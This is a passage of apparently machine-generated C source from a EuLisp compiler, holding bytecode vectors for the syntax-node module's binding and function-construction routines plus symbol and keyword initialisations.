binding: (method-binding-origin-module-name) */\n  static const void *G00754[] = {I(aa,8a,05,24),B(sx_obj1 ,42),I(08,45,00,00)};\n\n  /* Byte-vector with size: 5 is_init: 0 index: 40 binding: (method-binding-origin-module-name) */\n  static const void *G00756[] = {I(aa,8a,05,24),B(sx_obj1 ,42),I(08,8a,15,24),B(sx_obj1 ,59),I(08,45,00,00)};\n\n  /* Byte-vector with size: 146 is_init: 0 index: 46 binding: top-level */\n  static const void *G00758[] = {I(a9,83,24,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(sx_node ,41),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(sx_node ,28),I(2a,83,24,00),B(sx_obj1 ,27),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(sx_node ,42),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(sx_node ,21),I(2a,24,00,00),B(sx_node ,28),I(2a,24,00,00),B(sx_node ,28),I(8a,03,02,83),I(24,00,00,00),B(sx_obj1 ,42),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(sx_node ,28),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(sx_node ,43),I(23,00,00,00),B(sx_node ,40),I(3b,01,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(sx_node ,28),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(sx_node ,28),I(8a,03,02,83),I(24,00,00,00),B(sx_obj1 ,72),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(sx_node ,28),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(sx_node ,43),I(23,00,00,00),B(sx_node ,39),I(3b,01,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(sx_node ,28),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(i_param ,40),I(8a,03,02,83),I(86,24,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(i_param ,40),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(sx_node ,44),I(23,00,00,00),B(sx_node ,38),I(3b,01,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(i_param ,40),I(1c,24,00,00),B(mop_meth ,5),I(3c,02,2a,24),B(sx_node ,21),I(2a,24,00,00),B(sx_node ,21),I(8a,03,02,83),I(24,00,00,00),B(sx_obj1 ,42),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(sx_node ,21),I(8a,04,02,1c),I(1c,24,00,00),B(boot ,8),I(3c,02,1f,04),I(1f,04,23,00),B(sx_node ,45),I(23,00,00,00),B(sx_node ,36),I(3b,01,1f,03),I(24,00,00,00),B(mop_meth ,3),I(3c,04,24,00),B(sx_node ,21),I(1c,24,00,00),B(mop_meth ,5),I(3d,02,20,45),I(20,00,00,00)};\n\n  /* Byte-vector with size: 19 is_init: 0 index: 48 binding: register-delegated-vars */\n  static const void *G00765[] = {I(aa,23,00,00),B(sx_node ,47),I(24,00,00,00),B(dynamic ,3),I(3c,01,23,00),B(sx_node ,47),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,83),I(24,00,00,00),B(sx_obj ,13),I(08,1b,1f,04),I(24,00,00,00),B(boot ,8),I(3c,02,1f,03),I(1c,1c,83,1d),I(24,00,00,00),B(sx_obj ,13),I(09,45,07,00)};\n\n  /* Byte-vector with size: 33 is_init: 0 index: 54 binding: make-module */\n  static const void *G00768[] = {I(aa,24,00,00),B(aux_table ,4),I(3c,00,24,00),B(aux_table ,4),I(3c,00,24,00),B(aux_table ,4),I(3c,00,24,00),B(aux_table ,4),I(3c,00,24,00),B(sx_obj1 ,59),I(23,00,00,00),B(sx_node ,49),I(1f,06,23,00),B(sx_node ,50),I(1f,07,23,00),B(sx_node ,51),I(1f,08,23,00),B(sx_node ,52),I(1f,09,23,00),B(sx_node ,53),I(1f,0a,24,00),B(mop_gf ,2),I(3c,0b,1f,05),I(1c,24,00,00),B(p_env ,16),I(3c,02,2a,1b),I(24,00,00,00),B(i_param ,37),I(1c,8a,14,1d),I(24,00,00,00),B(sx_obj1 ,59),I(09,22,02,2a),I(1b,45,06,00)};\n\n  eul_allocate_static_string(str_777, \"no lexical binding ~a available\", 31);\n  /* Byte-vector with size: 63 is_init: 0 index: 59 binding: get-imported-inlined-setter-binding */\n  static const void *G00775[] = {I(ab,1c,73,1b),I(24,00,00,00),B(p_env ,7),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,3d),I(1c,1f,03,24),B(p_env ,18),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,23),I(1d,24,00,00),B(sx_node ,5),I(3c,01,1b,23),B(sx_node ,55),I(1f,05,24,00),B(i_notify ,6),I(3c,03,22,01),I(22,01,1b,23),B(sx_node ,56),I(24,00,00,00),B(sx_node ,20),I(3c,02,1b,34),I(00,00,00,95),I(1c,8a,05,24),B(sx_obj1 ,42),I(08,23,00,00),B(sx_node ,57),I(1d,0f,1b,86),I(0f,24,00,00),B(sx_obj1 ,72),I(23,00,00,00),B(sx_node ,29),I(1f,0a,23,00),B(sx_node ,30),I(1f,06,23,00),B(sx_node ,31),I(87,23,00,00),B(sx_node ,33),I(1f,10,23,00),B(sx_node ,32),I(87,23,00,00),B(sx_node ,35),I(1f,0c,24,00),B(mop_gf ,2),I(3c,0d,23,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(0a,24,00,00),B(sx_obj1 ,59),I(08,1d,1c,0f),I(1d,1c,1c,8a),I(0a,1d,24,00),B(sx_obj1 ,59),I(09,22,02,2a),I(1f,03,22,07),I(32,00,00,00),I(00,00,00,09),I(86,45,06,00)};\n\n  /* Byte-vector with size: 23 is_init: 0 index: 61 binding: make-dummy-binding */\n  static const void *G00781[] = {I(a8,1b,34,00),I(00,00,00,0e),I(1b,10,32,00),I(00,00,00,07),I(86,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,0f),I(23,00,00,00),B(sx_node ,60),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,24,00),B(sx_obj1 ,42),I(23,00,00,00),B(sx_node ,29),I(1f,03,23,00),B(sx_node ,30),I(1f,04,24,00),B(mop_gf ,2),I(3d,05,04,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 62 binding: make-defined-fun */\n  static const void *G00784[] = {I(43,03,24,00),B(sx_obj ,13),I(1f,03,1f,03),I(1f,03,24,00),B(sx_node ,8),I(3c,04,1b,24),B(sx_node ,22),I(3c,01,24,00),B(p_env ,5),I(3c,01,2a,1b),I(45,04,00,00)};\n\n  /* Byte-vector with size: 19 is_init: 0 index: 63 binding: compute-arity */\n  static const void *G00786[] = {I(aa,1b,24,00),B(list ,25),I(3c,01,1b,34),I(00,00,00,15),I(1c,24,00,00),B(boot ,19),I(3d,01,02,32),I(00,00,00,2d),I(1c,7a,12,1b),I(34,00,00,00),I(00,00,00,10),I(85,32,00,00),I(00,00,00,19),I(1d,24,00,00),B(boot ,19),I(3c,01,1b,83),I(14,82,1c,15),I(22,02,22,01),I(45,02,00,00)};\n\n  /* Byte-vector with size: 95 is_init: 0 index: 69 binding: make-fun */\n  static const void *G00788[] = {I(43,fb,1f,03),I(7a,1b,34,00),I(00,00,00,1a),I(1f,04,24,00),B(boot ,19),I(3c,01,83,19),I(32,00,00,00),I(00,00,00,09),I(86,1b,34,00),I(00,00,00,0e),I(1f,05,10,32),I(00,00,00,07),I(1f,05,1f,05),I(7c,1b,34,00),I(00,00,00,16),I(1f,06,24,00),B(boot1 ,26),I(3c,01,32,00),I(00,00,00,08),I(1f,06,1f,07),I(24,00,00,00),B(sx_node ,7),I(3c,01,1f,07),I(24,00,00,00),B(sx_obj1 ,70),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,12),I(23,00,00,00),B(sx_node ,64),I(1f,09,0f,1f),I(08,34,00,00),I(00,00,00,0f),I(1f,08,10,32),I(00,00,00,06),I(86,1f,0d,23),B(sx_node ,49),I(1f,08,23,00),B(sx_node ,65),I(1f,08,23,00),B(sx_node ,66),I(1f,09,23,00),B(sx_node ,67),I(1f,09,23,00),B(sx_node ,68),I(1f,0a,24,00),B(mop_gf ,2),I(3c,0b,1b,24),B(sx_obj ,44),I(3c,01,1b,34),I(00,00,00,a9),I(1f,0e,23,00),B(sx_node ,37),I(50,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,09),I(1f,0a,1b,34),I(00,00,00,45),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(08,24,00,00),B(sx_obj1 ,59),I(08,1b,1f,06),I(24,00,00,00),B(thread ,28),I(3c,02,1d,1c),I(1c,8a,08,1d),I(24,00,00,00),B(sx_obj1 ,59),I(09,22,05,32),I(00,00,00,40),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(09,24,00,00),B(sx_obj1 ,59),I(08,1b,1f,06),I(24,00,00,00),B(thread ,28),I(3c,02,1d,1c),I(1c,8a,09,1d),I(24,00,00,00),B(sx_obj1 ,59),I(09,22,05,22),I(02,32,00,00),I(00,00,00,08),I(86,2a,1c,45),I(10,00,00,00)};\n\n  /* Byte-vector with size: 67 is_init: 0 index: 75 binding: true-local-binding? */\n  static const void *G00795[] = {I(aa,1b,24,00),B(sx_obj1 ,14),I(3c,01,1b,34),I(00,00,00,fd),I(1c,84,24,00),B(sx_obj1 ,42),I(08,1d,24,00),B(sx_obj1 ,10),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,d7),I(1f,03,8a,03),I(24,00,00,00),B(sx_obj1 ,42),I(08,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,b9),I(1d,24,00,00),B(sx_obj ,7),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,9f),I(1f,05,23,00),B(sx_node ,70),I(24,00,00,00),B(sx_node ,20),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,7d),I(1f,06,23,00),B(sx_node ,71),I(24,00,00,00),B(sx_node ,20),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,5b),I(1f,07,23,00),B(sx_node ,72),I(24,00,00,00),B(sx_node ,20),I(3c,02,23,00),B(sx_node ,73),I(50,1b,34,00),I(00,00,00,1e),I(1f,08,23,00),B(sx_node ,74),I(24,00,00,00),B(sx_node ,20),I(3c,02,32,00),I(00,00,00,07),I(86,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,11),I(1f,07,24,00),B(mop_inspect ,8),I(3c,01,22,02),I(22,01,22,01),I(22,01,22,01),I(12,22,02,32),I(00,00,00,06),I(86,45,02,00)};\n\n  /* Byte-vector with size: 23 is_init: 0 index: 77 binding: make-defined-opencoded-fun */\n  static const void *G00802[] = {I(43,03,86,1f),I(03,24,00,00),B(sx_node ,22),I(3c,02,1d,24),B(sx_node ,7),I(3c,01,1c,24),B(p_env ,5),I(3c,01,2a,23),B(sx_node ,72),I(23,00,00,00),B(sx_node ,70),I(0f,23,00,00),B(sx_node ,76),I(1d,0f,23,00),B(sx_node ,70),I(1f,05,0f,1b),I(86,0f,1d,1c),I(0f,1f,04,1c),I(0f,1f,07,1c),I(1c,82,1d,24),B(sx_obj1 ,42),I(09,22,02,2a),I(1f,07,45,0b)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 78 binding: get-binding-spec-info */\n  static const void *G00805[] = {I(ab,1b,1d,1b),I(1d,86,6a,22),I(02,1b,34,00),I(00,00,00,0e),I(1b,11,32,00),I(00,00,00,07),I(86,45,03,00)};\n\n  /* Byte-vector with size: 9 is_init: 0 index: 80 binding: make-setq */\n  static const void *G00807[] = {I(ab,24,00,00),B(sx_obj2 ,25),I(23,00,00,00),B(sx_node ,79),I(1f,03,23,00),B(sx_node ,33),I(1f,04,24,00),B(mop_gf ,2),I(3d,05,02,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 83 binding: make-local-static-var */\n  static const void *G00810[] = {I(43,fe,1b,34),I(00,00,00,0d),I(1b,10,32,00),I(00,00,00,07),I(86,24,00,00),B(sx_obj2 ,9),I(23,00,00,00),B(sx_node ,49),I(1f,04,23,00),B(sx_node ,81),I(1f,04,23,00),B(sx_node ,82),I(82,24,00,00),B(mop_gf ,2),I(3c,07,1b,24),B(sx_node ,15),I(3c,01,2a,1b),I(45,04,00,00)};\n\n  /* Byte-vector with size: 12 is_init: 0 index: 84 binding: foldable-constant? */\n  static const void *G00814[] = {I(aa,1b,24,00),B(number ,24),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,1b),I(1c,81,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,09),I(1d,12,22,01),I(45,02,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 86 binding: make-mutable-binding */\n  static const void *G00816[] = {I(43,fe,1b,34),I(00,00,00,0d),I(1b,10,32,00),I(00,00,00,07),I(86,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,19),I(1d,23,00,00),B(sx_node ,85),I(24,00,00,00),B(mop_defcl ,8),I(3c,02,1f,03),I(1c,86,24,00),B(sx_node ,23),I(3d,03,04,00)};\n\n  eul_allocate_static_cons(cons_822, NULL, NULL);\n  eul_allocate_static_cons(cons_821, eul_as_static(cons_822), NULL);\n  /* Byte-vector with size: 67 is_init: 0 index: 88 binding: make-named-const */\n  static const void *G00819[] = {I(ab,24,00,00),B(sx_obj2 ,22),I(23,00,00,00),B(sx_node ,49),I(1f,03,23,00),B(sx_node ,81),I(1f,04,24,00),B(mop_gf ,2),I(3c,05,1b,24),B(sx_node ,22),I(3c,01,24,00),B(i_param ,10),I(12,1b,34,00),I(00,00,00,16),I(1f,03,24,00),B(sx_node ,14),I(3c,01,32,00),I(00,00,00,07),I(86,1b,34,00),I(00,00,00,56),I(23,00,00,00),B(sx_node ,72),I(23,00,00,00),B(sx_node ,73),I(0f,1f,05,86),I(0f,23,00,00),B(sx_node ,74),I(1c,0f,1b,86),I(0f,1f,03,1c),I(0f,1f,07,82),I(24,00,00,00),B(sx_obj1 ,42),I(08,1c,1c,24),B(boot ,8),I(3c,02,1f,09),I(1c,1c,82,1d),I(24,00,00,00),B(sx_obj1 ,42),I(09,22,09,32),I(00,00,00,30),I(23,00,00,00),B(sx_node ,87),I(1f,03,82,24),B(sx_obj1 ,42),I(08,1c,1c,24),B(boot ,8),I(3c,02,1f,05),I(1c,1c,82,1d),I(24,00,00,00),B(sx_obj1 ,42),I(09,22,05,2a),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(0d,24,00,00),B(sx_obj1 ,59),I(08,1f,05,1c),I(0f,1d,1c,1c),I(8a,0d,1d,24),B(sx_obj1 ,59),I(09,22,02,2a),I(1f,05,24,00),B(p_env ,5),I(3c,01,2a,1f),I(06,45,09,00)};\n\n  /* Byte-vector with size: 27 is_init: 0 index: 89 binding: make-global-var */\n  static const void *G00823[] = {I(ab,24,00,00),B(sx_obj2 ,28),I(23,00,00,00),B(sx_node ,49),I(1f,03,23,00),B(sx_node ,81),I(1f,04,23,00),B(sx_node ,82),I(82,24,00,00),B(mop_gf ,2),I(3c,07,1b,24),B(sx_node ,15),I(3c,01,24,00),B(p_env ,5),I(3c,01,2a,23),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(0c,24,00,00),B(sx_obj1 ,59),I(08,1d,1c,0f),I(1d,1c,1c,8a),I(0c,1d,24,00),B(sx_obj1 ,59),I(09,22,02,2a),I(1f,03,45,06)};\n\n  /* Byte-vector with size: 58 is_init: 0 index: 90 binding: make-defined-external-fun */\n  static const void *G00825[] = {I(43,04,24,00),B(i_ffi ,7),I(1f,03,24,00),B(boot ,11),I(3c,02,1d,24),B(i_ffi ,3),I(3c,01,86,1f),I(06,24,00,00),B(sx_node ,22),I(3c,02,1f,05),I(24,00,00,00),B(sx_node ,7),I(3c,01,1f,04),I(34,00,00,00),I(00,00,00,10),I(1f,04,10,32),I(00,00,00,06),I(86,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,0b),I(1f,08,82,02),I(1f,03,24,00),B(p_env ,5),I(3c,01,2a,23),B(sx_node ,72),I(23,00,00,00),B(sx_node ,71),I(0f,23,00,00),B(sx_node ,76),I(1f,04,0f,1d),I(86,0f,1f,07),I(1c,0f,1f,09),I(1c,0f,23,00),B(sx_node ,71),I(1c,0f,1b,86),I(0f,1f,05,1c),I(0f,1f,07,1c),I(0f,1f,0c,1c),I(1c,82,1d,24),B(sx_obj1 ,42),I(09,22,02,2a),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(07,24,00,00),B(sx_obj1 ,59),I(08,1b,1f,0f),I(24,00,00,00),B(thread ,28),I(3c,02,1d,1c),I(1c,8a,07,1d),I(24,00,00,00),B(sx_obj1 ,59),I(09,22,02,2a),I(1f,0f,45,16)};\n\n  /* Byte-vector with size: 5 is_init: 0 index: 91 binding: anonymous */\n  static const void *G00827[] = {I(aa,1b,47,00),I(00,1c,83,1d),I(24,00,00,00),B(sx_obj2 ,9),I(09,45,03,00)};\n\n  /* Byte-vector with size: 20 is_init: 0 index: 92 binding: make-let* */\n  static const void *G00829[] = {I(ab,46,01,24),B(sx_obj ,2),I(23,00,00,00),B(sx_node ,37),I(1f,03,1f,03),I(24,00,00,00),B(sx_node ,8),I(3c,04,1b,48),I(00,00,23,00),B(sx_node ,37),I(23,00,00,00),B(sx_node ,91),I(3b,01,1f,03),I(24,00,00,00),B(boot ,17),I(3c,02,2a,1d),I(24,00,00,00),B(sx_node ,2),I(3c,01,2a,47),I(00,00,45,03)};\n\n  /* Byte-vector with size: 5 is_init: 0 index: 93 binding: get-binding-info */\n  static const void *G00831[] = {I(ab,1c,82,24),B(sx_obj1 ,42),I(08,24,00,00),B(sx_node ,11),I(3d,02,01,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 94 binding: make-immutable-binding */\n  static const void *G00833[] = {I(43,fe,1b,34),I(00,00,00,0d),I(1b,10,32,00),I(00,00,00,07),I(86,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,19),I(1d,23,00,00),B(sx_node ,85),I(24,00,00,00),B(mop_defcl ,8),I(3c,02,1f,03),I(1c,87,24,00),B(sx_node ,23),I(3d,03,04,00)};\n\n  /* Byte-vector with size: 31 is_init: 0 index: 95 binding: make-binding */\n  static const void *G00835[] = {I(43,fd,23,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1c,34),I(00,00,00,0d),I(1c,10,32,00),I(00,00,00,07),I(86,24,00,00),B(sx_obj1 ,42),I(23,00,00,00),B(sx_node ,29),I(1f,05,23,00),B(sx_node ,30),I(1f,05,23,00),B(sx_node ,31),I(1f,06,23,00),B(sx_node ,33),I(1f,0c,24,00),B(mop_gf ,2),I(3c,09,1f,05),I(24,00,00,00),B(sx_obj1 ,70),I(3c,01,1b,34),I(00,00,00,15),I(1f,06,1d,24),B(sx_obj ,33),I(3c,02,32,00),I(00,00,00,07),I(86,2a,1c,45),I(07,00,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 96 binding: anonymous */\n  static const void *G00837[] = {I(aa,1b,34,00),I(00,00,00,3a),I(1b,10,1b,8a),I(06,24,00,00),B(sx_obj1 ,42),I(08,1b,73,1b),I(47,00,01,50),I(1b,34,00,00),I(00,00,00,0f),I(1f,04,10,32),I(00,00,00,0e),I(1f,04,11,47),I(00,00,3d,01),I(05,22,04,32),I(00,00,00,06),I(86,45,01,00)};\n\n  /* Byte-vector with size: 25 is_init: 0 index: 97 binding: get-inlined-setter-binding */\n  static const void *G00839[] = {I(ab,46,03,1c),I(73,1b,48,00),I(01,86,1b,48),I(00,00,23,00),B(sx_node ,37),I(23,00,00,00),B(sx_node ,96),I(3b,01,48,00),I(00,1f,03,1f),I(03,24,00,00),B(sx_node ,4),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,2c),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(0a,24,00,00),B(sx_obj1 ,59),I(08,47,00,00),I(3d,01,06,22),I(01,45,05,00)};\n\n  /* Byte-vector with size: 26 is_init: 0 index: 98 binding: register-binding-ref */\n  static const void *G00841[] = {I(aa,23,00,00),B(sx_node ,47),I(24,00,00,00),B(dynamic ,3),I(3c,01,23,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1c,34),I(00,00,00,25),I(1c,82,24,00),B(sx_obj ,13),I(08,1f,03,1c),I(0f,1f,03,1c),I(1c,82,1d,24),B(sx_obj ,13),I(09,22,04,32),I(00,00,00,20),I(1b,8a,05,24),B(sx_obj1 ,59),I(08,1f,03,1c),I(0f,1d,1c,1c),I(8a,05,1d,24),B(sx_obj1 ,59),I(09,22,04,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 27 is_init: 0 index: 99 binding: make-inlined-setter */\n  static const void *G00843[] = {I(43,03,24,00),B(sx_obj ,13),I(1f,03,1f,03),I(1f,03,24,00),B(sx_node ,8),I(3c,04,1b,24),B(sx_node ,22),I(3c,01,1c,87),I(1c,84,1d,24),B(sx_obj ,13),I(09,22,02,2a),I(23,00,00,00),B(sx_node ,58),I(24,00,00,00),B(dynamic ,3),I(3c,01,1b,8a),I(0a,24,00,00),B(sx_obj1 ,59),I(08,1b,1f,03),I(24,00,00,00),B(thread ,28),I(3c,02,1d,1c),I(1c,8a,0a,1d),I(24,00,00,00),B(sx_obj1 ,59),I(09,22,02,2a),I(1f,04,45,08)};\n\n  /* Byte-vector with size: 49 is_init: 0 index: 100 binding: non-folded-local-binding? */\n  static const void *G00845[] = {I(aa,1b,24,00),B(sx_obj1 ,14),I(3c,01,1b,34),I(00,00,00,b5),I(1c,84,24,00),B(sx_obj1 ,42),I(08,1d,24,00),B(sx_obj1 ,10),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,8d),I(1f,03,8a,03),I(24,00,00,00),B(sx_obj1 ,42),I(08,1b,34,00),I(00,00,00,0e),I(1b,32,00,00),I(00,00,00,6f),I(1d,24,00,00),B(sx_obj ,7),I(3c,01,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,55),I(1f,05,23,00),B(sx_node ,70),I(24,00,00,00),B(sx_node ,20),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,33),I(1f,06,23,00),B(sx_node ,71),I(24,00,00,00),B(sx_node ,20),I(3c,02,1b,34),I(00,00,00,0d),I(1b,32,00,00),I(00,00,00,11),I(1f,05,24,00),B(mop_inspect ,8),I(3c,01,22,01),I(22,01,22,01),I(22,01,12,22),I(02,32,00,00),I(00,00,00,08),I(86,45,02,00)};\n\n  /* Byte-vector with size: 182 is_init: 1 index: 0 binding: initialize-sx-node */\n  static const void *G00847[] = {I(87,25,00,00),B(sx_node ,1),I(24,00,00,00),B(p_env ,1),I(3e,0b,24,00),B(p_env ,0),I(3c,00,21,01),I(24,00,00,00),B(sx_obj ,1),I(3e,0b,24,00),B(sx_obj ,0),I(3c,00,21,01),I(24,00,00,00),B(i_ffi ,1),I(3e,0b,24,00),B(i_ffi ,0),I(3c,00,21,01),I(24,00,00,00),B(i_all ,1),I(3e,0b,24,00),B(i_all ,0),I(3c,00,21,01),I(86,25,00,00),B(sx_node ,28),I(23,00,00,00),B(sx_node ,101),I(23,00,00,00),B(sx_node ,100),I(3b,01,25,00),B(sx_node ,27),I(23,00,00,00),B(sx_node ,102),I(23,00,00,00),B(sx_node ,99),I(3b,03,25,00),B(sx_node ,26),I(23,00,00,00),B(sx_node ,103),I(23,00,00,00),B(sx_node ,98),I(3b,01,25,00),B(sx_node ,25),I(23,00,00,00),B(sx_node ,104),I(23,00,00,00),B(sx_node ,97),I(3b,02,25,00),B(sx_node ,24),I(23,00,00,00),B(sx_node ,105),I(23,00,00,00),B(sx_node ,95),I(3b,fd,25,00),B(sx_node ,23),I(23,00,00,00),B(sx_node ,106),I(23,00,00,00),B(sx_node ,94),I(3b,fe,25,00),B(sx_node ,22),I(86,25,00,00),B(sx_node ,21),I(23,00,00,00),B(sx_node ,107),I(23,00,00,00),B(sx_node ,93),I(3b,02,25,00),B(sx_node ,20),I(23,00,00,00),B(sx_node ,108),I(23,00,00,00),B(sx_node ,92),I(3b,02,25,00),B(sx_node ,19),I(23,00,00,00),B(sx_node ,109),I(23,00,00,00),B(sx_node ,90),I(3b,04,25,00),B(sx_node ,18),I(23,00,00,00),B(sx_node ,110),I(23,00,00,00),B(sx_node ,89),I(3b,02,25,00),B(sx_node ,17),I(23,00,00,00),B(sx_node ,111),I(23,00,00,00),B(sx_node ,88),I(3b,02,25,00),B(sx_node ,16),I(23,00,00,00),B(sx_node ,112),I(23,00,00,00),B(sx_node ,86),I(3b,fe,25,00),B(sx_node ,15),I(23,00,00,00),B(sx_node ,113),I(23,00,00,00),B(sx_node ,84),I(3b,01,25,00),B(sx_node ,14),I(23,00,00,00),B(sx_node ,114),I(23,00,00,00),B(sx_node ,83),I(3b,fe,25,00),B(sx_node ,13),I(23,00,00,00),B(sx_node ,115),I(23,00,00,00),B(sx_node ,80),I(3b,02,25,00),B(sx_node ,12),I(23,00,00,00),B(sx_node ,116),I(23,00,00,00),B(sx_node ,78),I(3b,02,25,00),B(sx_node ,11),I(23,00,00,00),B(sx_node ,117),I(23,00,00,00),B(sx_node ,77),I(3b,03,25,00),B(sx_node ,10),I(23,00,00,00),B(sx_node ,118),I(23,00,00,00),B(sx_node ,75),I(3b,01,25,00),B(sx_node ,9),I(23,00,00,00),B(sx_node ,119),I(23,00,00,00),B(sx_node ,69),I(3b,fb,25,00),B(sx_node ,8),I(23,00,00,00),B(sx_node ,120),I(23,00,00,00),B(sx_node ,63),I(3b,01,25,00),B(sx_node ,7),I(23,00,00,00),B(sx_node ,121),I(23,00,00,00),B(sx_node ,62),I(3b,03,25,00),B(sx_node ,6),I(23,00,00,00),B(sx_node ,122),I(23,00,00,00),B(sx_node ,61),I(3b,ff,25,00),B(sx_node ,5),I(23,00,00,00),B(sx_node ,123),I(23,00,00,00),B(sx_node ,59),I(3b,02,25,00),B(sx_node ,4),I(23,00,00,00),B(sx_node ,124),I(23,00,00,00),B(sx_node ,54),I(3b,01,25,00),B(sx_node ,3),I(23,00,00,00),B(sx_node ,125),I(23,00,00,00),B(sx_node ,48),I(3b,01,25,00),B(sx_node ,2),I(23,00,00,00),B(sx_node ,126),I(23,00,00,00),B(sx_node ,46),I(3b,00,3d,00),I(00,ac,00,00)};\n\n\n  /* Initializations */\n  eul_intern_keyword(key_744,\"local-name\");\n  eul_intern_keyword(key_745,\"module\");\n  eul_intern_keyword(key_746,\"immutable\");\n  eul_intern_keyword(key_747,\"imported\");\n  eul_intern_keyword(key_748,\"obj\");\n  eul_intern_keyword(key_749,\"local-index\");\n  eul_intern_keyword(key_750,\"info\");\n  eul_allocate_bytevector( G00743,G00742);\n  eul_intern_symbol(sym_753,\"anonymous\");\n  eul_allocate_bytevector( G00752,G00751);\n  eul_allocate_bytevector( G00755,G00754);\n  eul_allocate_bytevector( G00757,G00756);\n  eul_intern_symbol(sym_760,\"binding-origin-module-name\");\n  eul_intern_symbol(sym_761,\"clone-node\");\n  eul_intern_symbol(sym_762,\"(method binding-origin-module-name)\");\n  eul_intern_symbol(sym_763,\"(method get-named-encl-lambda)\");\n  eul_intern_symbol(sym_764,\"(method clone-node)\");\n  eul_allocate_bytevector( G00759,G00758);\n  eul_intern_symbol(sym_767,\"*encl-lambda*\");\n  eul_allocate_bytevector( G00766,G00765);\n  eul_intern_keyword(key_770,\"name\");\n  eul_intern_keyword(key_771,\"lexical-env\");\n  eul_intern_keyword(key_772,\"interactive-lexical-env\");\n  eul_intern_keyword(key_773,\"external-env\");\n  eul_intern_keyword(key_774,\"syntax-env\");\n  eul_allocate_bytevector( G00769,G00768);\n  object_class(str_777) = eul_static_string_class;\n  eul_intern_symbol(sym_778,\"setter\");\n  eul_intern_symbol(sym_779,\"inline\");\n  eul_intern_symbol(sym_780,\"*actual-module*\");\n  eul_allocate_bytevector( G00776,G00775);\n  eul_intern_symbol(sym_783,\" unbound \");\n  eul_allocate_bytevector( G00782,G00781);\n  eul_allocate_bytevector( G00785,G00784);\n  eul_allocate_bytevector( G00787,G00786);\n  eul_intern_symbol(sym_790,\"progn\");\n  eul_intern_keyword(key_791,\"args\");\n  eul_intern_keyword(key_792,\"arity\");\n  eul_intern_keyword(key_793,\"body\");\n  eul_intern_keyword(key_794,\"has-unknown-appls\");\n  eul_allocate_bytevector( 